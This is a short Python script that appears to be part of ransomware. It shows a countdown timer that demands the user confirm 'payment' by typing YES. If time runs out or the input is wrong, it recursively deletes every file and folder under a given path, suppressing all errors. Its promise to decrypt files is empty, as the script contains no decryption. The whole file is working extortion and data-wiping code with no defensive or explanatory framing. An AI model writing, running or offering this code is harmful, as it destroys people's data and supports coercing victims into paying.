import os
import time
import shutil
import threading
import sys

def delete_files(folder_path):
    for root, dirs, files in os.walk(folder_path, topdown=False):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except:
                pass
        for dir in dirs:
            try:
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
            except:
                pass

def countdown_with_user_check(folder_path, delay_seconds):
    user_input = []
    input_ready = threading.Event()

    def get_input():
        # Move to new line so countdown doesn't interfere
        print("\nType 'YES' to confirm payment before time runs out:")
        response = input("> ").strip().upper()
        user_input.append(response)
        input_ready.set()

    input_thread = threading.Thread(target=get_input)
    input_thread.daemon = True
    input_thread.start()

    for remaining in range(delay_seconds, 0, -1):
        if input_ready.is_set():
            break
        sys.stdout.write(f"\rTime left: {remaining:3d} seconds ")
        sys.stdout.flush()
        time.sleep(1)

    print()  # Finish countdown line

    if user_input and user_input[0] == 'YES':
        print("Payment confirmed. Decrypting files...")
        return True
    else:
        print("Time expired or invalid input. Deleting files...")
        delete_files(folder_path)
        return False
